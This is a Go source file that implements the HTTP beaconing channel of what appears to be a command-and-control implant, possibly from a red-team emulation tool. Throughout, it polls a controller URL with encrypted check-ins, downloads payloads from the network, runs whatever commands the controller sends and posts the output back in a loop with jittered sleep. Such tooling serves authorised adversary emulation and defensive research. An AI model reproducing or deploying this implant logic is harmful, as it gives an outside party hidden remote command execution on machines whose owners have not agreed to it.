package sockets

import (
	"../commands"
	"../util"
	"bytes"
	"encoding/json"
	"errors"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"path"
	"strings"
)

type HTTP struct {}

func init() {
	CommunicationChannels["http"] = HTTP{}
}

func (contact HTTP) Communicate(address string, sleep int, beacon Beacon) {
	checkValidHTTPTarget(address, true)
	for {
		beacon.Links = beacon.Links[:0]

		body := beaconPOST(address, beacon)
		var tempB Beacon
		json.Unmarshal(body, &tempB)

		for _, link := range tempB.Links {
			if len(link.Payload) > 0 {
				requestPayload(link.Payload)
			}
			response, status, pid := commands.RunCommand(link.Request, link.Executor)
			link.Response = strings.TrimSpace(response)
			link.Status = status
			link.Pid = pid
			beacon.Links = append(beacon.Links, link)
		}
		beaconPOST(address, beacon)
		jitterSleep(sleep, "HTTP")
	}
}

func checkValidHTTPTarget(address string, fatal bool) (bool, error) {
	u, err := url.Parse(address)
	if err != nil || u.Scheme == "" || u.Host == "" {
		if fatal {
			log.Fatalf("[%s] is an invalid URL for HTTP/S beacons", address)
		}
		log.Printf("[%s] is an invalid URL for HTTP/S beacons", address)
		return false, errors.New("INVALID URL")
	}
	return true, nil
}

func requestHTTPPayload(address string) ([]byte, string, error) {
	valid, err := checkValidHTTPTarget(address, false)
	if  valid {
		body, _, err := request(address, "GET", []byte{})
		return body, path.Base(address), err
	}
	return nil, "", err
}

func beaconPOST(address string, beacon Beacon) []byte {
	data, _ := json.Marshal(beacon)
	body, _, _ := request(address, "POST", util.Encrypt(data))
	if len(body) > 0 {
		return []byte(util.Decrypt(string(body)))
	}
	return body
}

func request(address string, method string, data []byte) ([]byte, http.Header, error) {
	client := &http.Client{}

	req, err := http.NewRequest(method, address, bytes.NewBuffer(data))
	if err != nil {
		log.Print(err)
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
		return nil, nil, err
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Print(err)
		return nil, nil, err
	}

	err = resp.Body.Close()
	if err != nil {
		log.Print(err)
		return nil, nil, err
	}

	return body, resp.Header, err
}